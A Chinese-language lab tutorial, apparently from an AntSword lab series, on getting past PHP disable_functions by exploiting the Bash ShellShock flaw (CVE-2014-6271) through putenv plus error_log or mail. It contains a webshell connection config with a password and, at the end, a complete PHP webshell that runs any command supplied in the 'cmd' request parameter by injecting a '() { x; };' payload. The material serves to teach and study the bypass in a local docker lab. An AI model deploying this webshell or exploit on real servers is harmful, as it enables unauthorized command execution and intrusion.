## 02 利用 ShellShock (CVE-2014-6271)

### php.ini 配置如下:

```ini
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
```

### 使用条件

* Linux 操作系统
* `putenv`
* `mail` or `error_log` 本例中禁用了 `mail` 但未禁用 `error_log`
* `/bin/bash` 存在 `CVE-2014-6271` 漏洞
* `/bin/sh -> /bin/bash` sh 默认的 shell 是 bash 

###  绕过实验

AntSword >= 2.1.4

1. 启动环境

```
$ docker-compose up -d
```

Shell | 密码
:-:|:-:|:-:
`http://127.0.0.1:18080/index.php` | ant
`http://127.0.0.1:18080/shell.php` | ant

2. 打开 AntSword 添加 Shell

![1.png](https://i.loli.net/2019/07/08/5d221a74179c434216.png)

也可直接使用配置导入插件导入下面的配置:

```
{"_id":"NKonQAcRd5DAIcRj","addr":"IANA 保留地址用于本地回送","category":"default","ctime":1562515402313,"decoder":"default","encode":"UTF8","encoder":"base64","httpConf":{"body":{},"headers":{"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/5.4.1 NetType/WIFI"}},"ip":"127.0.0.1","note":"AntSword-Labs Bypass disable functions 2","otherConf":{"chunk-step-byte-max":"3","chunk-step-byte-min":"2","command-path":"","filemanager-cache":1,"ignore-https":1,"request-timeout":"30000","terminal-cache":0,"upload-fragment":"500","use-chunk":0,"use-multipart":0},"pwd":"ant","type":"php","url":"http://127.0.0.1:18080/index.php","utime":1562515402313}
```

3. 查看 PHPINFO 验证是 system 等函数已被禁用

![2.png](https://i.loli.net/2019/07/08/5d221a77ee2f022649.png)

4. AntSword 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可

![3.png](https://i.loli.net/2019/07/08/5d221a7accb5f56265.png)

**注意1:**

注意看上图中 1 位置的进程树的情况

如果执行命令直接使用 `system` 等执行命令的函数, 进程列表是这样的:

```
www-data   810   684  0 Jul06 ?        00:00:14 /usr/sbin/apache2 -k start
www-data   909   712  0 00:17 ?        00:00:00 sh -c /bin/sh -c "cd "/var/www/html";ps -aef;echo [S];pwd;echo [E]" 2>&1
www-data   910   909  0 00:17 ?        00:00:00 /bin/sh -c cd /var/www/html;ps -aef;echo [S];pwd;echo [E]
www-data   911   910  0 00:17 ?        00:00:00 ps -aef
```

可以明显看出本例中执行命令时, 利用了 PHP `error_log` 函数在执行 `sh -c  -t -i ` 时, Bash 的 ShellShock 漏洞, 从而实现了执行我们自定义命令的目的。 

**注意2:**

执行了 `ls -al /tmp`, 可以看到每次都生成了以 `as` 开头的临时文件, 这就是我们执行完命令之后, 将输出重定向到了临时文件中, 然后再读出来


#### 手动

原理脚本如下:

```
<?php
function runcmd($c){
  $d = dirname($_SERVER["SCRIPT_FILENAME"]);
  if(substr($d, 0, 1) == "/" && function_exists('putenv') && (function_exists('error_log') || function_exists('mail'))){
    if(strstr(readlink("/bin/sh"), "bash")!=FALSE){
      $tmp=tempnam(sys_get_temp_dir(), 'as');
      putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
      if (function_exists('error_log')) {
        error_log("a", 1);
      }else{
        mail("a@127.0.0.1", "", "", "-bv");
      }
    }else{
      print("Not vuln (not bash)\n");
    }
    $output = @file_get_contents($tmp);
    @unlink($tmp);
    if($output!=""){
      print($output);
    }else{
      print("No output, or not vuln.");
    }
  }else{
    print("不满足使用条件");
  }
}

// runcmd("whoami"); // 要执行的命令
runcmd($_REQUEST["cmd"]); // ?cmd=whoami
?>
```
